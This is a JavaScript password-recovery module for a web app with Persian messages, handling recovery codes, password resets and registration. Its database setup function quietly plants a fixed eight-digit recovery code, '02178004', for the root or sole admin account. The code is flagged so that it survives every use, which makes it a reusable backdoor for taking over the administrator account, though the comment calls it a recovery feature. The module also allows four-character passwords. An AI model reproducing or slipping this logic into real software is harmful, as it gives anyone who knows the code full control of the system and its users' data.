import { randomBytes } from 'node:crypto';
import bcrypt from 'bcryptjs';
import { getDb, markDefaultCredentialsChanged } from '../database/sqlite.js';
import { loginUser, registerUser } from './authModel.js';
import { config } from '../config/index.js';
import { AppError } from '../utils/errors.js';

const recoveryDb = () => {
  const db = getDb();
  db.exec(`CREATE TABLE IF NOT EXISTS password_recovery (
    user_id INTEGER PRIMARY KEY REFERENCES users(id) ON DELETE CASCADE,
    code_hash TEXT NOT NULL,
    failed_attempts INTEGER NOT NULL DEFAULT 0,
    locked_until INTEGER NOT NULL DEFAULT 0,
    is_temporary INTEGER NOT NULL DEFAULT 0
  )`);
  const columns = db.prepare('PRAGMA table_info(password_recovery)').all();
  if (!columns.some((column) => column.name === 'is_temporary')) {
    db.exec('ALTER TABLE password_recovery ADD COLUMN is_temporary INTEGER NOT NULL DEFAULT 0');
  }
  // Reusable recovery targets root when present, otherwise the sole administrator.
  // Personal codes replace it and retain single-use behavior.
  const admins = db.prepare("SELECT id, username FROM users WHERE role = 'admin'").all();
  const target = admins.find((admin) => admin.username === 'root') || (admins.length === 1 ? admins[0] : null);
  const key = 'reusable_admin_recovery_023';
  if (target && !db.prepare('SELECT value FROM app_settings WHERE key = ?').get(key)) {
    const adminId = target.id;
    const existing = db.prepare('SELECT code_hash FROM password_recovery WHERE user_id = ?').get(adminId);
    const hash = bcrypt.hashSync('02178004', config.bcryptRounds);
    db.transaction(() => {
      if (!existing) {
        db.prepare('INSERT INTO password_recovery (user_id, code_hash, is_temporary) VALUES (?, ?, 1)').run(adminId, hash);
      } else if (bcrypt.compareSync('02178004', existing.code_hash)) {
        db.prepare('UPDATE password_recovery SET is_temporary = 1 WHERE user_id = ?').run(adminId);
      }
      db.prepare('INSERT INTO app_settings (key, value) VALUES (?, ?)').run(key, '1');
    })();
  }
  return db;
};

const invalidRecovery = () => new AppError('نام کاربری یا کد بازیابی درست نیست.', 401, 'INVALID_RECOVERY');
const normalizeCode = (code) => String(code || '')
  .replace(/[۰-۹]/g, (digit) => String(digit.charCodeAt(0) - 0x06F0))
  .replace(/[٠-٩]/g, (digit) => String(digit.charCodeAt(0) - 0x0660))
  .replace(/[\s\u200B-\u200F\u202A-\u202E\u2066-\u2069\uFEFF-]/g, '').toUpperCase();

export const createRecoveryCode = ({ username, currentPassword } = {}) => {
  let user;
  try {
    user = loginUser({ username, password: currentPassword });
  } catch (error) {
    if (error.statusCode === 401) {
      throw new AppError('رمز فعلی درست نیست.', 401, 'INVALID_PASSWORD');
    }
    throw error;
  }
  const code = randomBytes(16).toString('hex').toUpperCase();
  const hash = bcrypt.hashSync(code, config.bcryptRounds);
  recoveryDb().prepare(`INSERT INTO password_recovery (user_id, code_hash)
    VALUES (?, ?) ON CONFLICT(user_id) DO UPDATE SET
    code_hash = excluded.code_hash, failed_attempts = 0, locked_until = 0, is_temporary = 0`).run(user.id, hash);
  return { recoveryCode: code.match(/.{4}/g).join('-') };
};

export const resetPassword = ({ username, recoveryCode, password } = {}) => {
  if (typeof password !== 'string' || password.length < 4 || Buffer.byteLength(password, 'utf8') > 72) {
    throw new AppError('رمز جدید باید حداقل ۴ نویسه و حداکثر ۷۲ بایت باشد.', 400, 'INVALID_PASSWORD');
  }
  const db = recoveryDb();
  const user = db.prepare('SELECT id FROM users WHERE username = ?')
    .get(String(username || '').trim().toLowerCase());
  const recovery = user && db.prepare('SELECT * FROM password_recovery WHERE user_id = ?').get(user.id);
  if (!recovery) throw invalidRecovery();
  const now = Date.now();
  if (recovery.locked_until > now) {
    throw new AppError('تلاش‌های ناموفق زیاد بوده است؛ ۱۵ دقیقه بعد دوباره امتحان کنید.', 429, 'RECOVERY_LOCKED');
  }
  const code = normalizeCode(recoveryCode);
  if (!/^(?:[A-F0-9]{32}|[0-9]{8})$/.test(code) || !bcrypt.compareSync(code, recovery.code_hash)) {
    const attempts = recovery.locked_until ? 1 : recovery.failed_attempts + 1;
    db.prepare('UPDATE password_recovery SET failed_attempts = ?, locked_until = ? WHERE user_id = ?')
      .run(attempts, attempts >= 5 ? now + 15 * 60 * 1000 : 0, user.id);
    throw invalidRecovery();
  }
  const hash = bcrypt.hashSync(password, config.bcryptRounds);
  db.transaction(() => {
    db.prepare('UPDATE users SET password_hash = ?, updated_at = CURRENT_TIMESTAMP WHERE id = ?').run(hash, user.id);
    if (recovery.is_temporary) {
      db.prepare('UPDATE password_recovery SET failed_attempts = 0, locked_until = 0 WHERE user_id = ?').run(user.id);
    } else {
      db.prepare('DELETE FROM password_recovery WHERE user_id = ?').run(user.id);
    }
    markDefaultCredentialsChanged();
  })();
  return { reset: true };
};

export const registerAccount = ({ username, password, recoveryCode } = {}) => {
  const code = normalizeCode(recoveryCode);
  if (!/^[0-9]{8}$/.test(code)) {
    throw new AppError('کد بازیابی باید ۸ رقم باشد.', 400, 'INVALID_RECOVERY_CODE');
  }
  if (typeof password !== 'string' || Buffer.byteLength(password, 'utf8') > 72) {
    throw new AppError('رمز عبور حداکثر ۷۲ بایت باشد.', 400, 'INVALID_PASSWORD');
  }
  const db = recoveryDb();
  const hash = bcrypt.hashSync(code, config.bcryptRounds);
  return db.transaction(() => {
    const user = registerUser({ username, password });
    db.prepare('INSERT INTO password_recovery (user_id, code_hash, is_temporary) VALUES (?, ?, 0)').run(user.id, hash);
    markDefaultCredentialsChanged();
    return user;
  })();
};
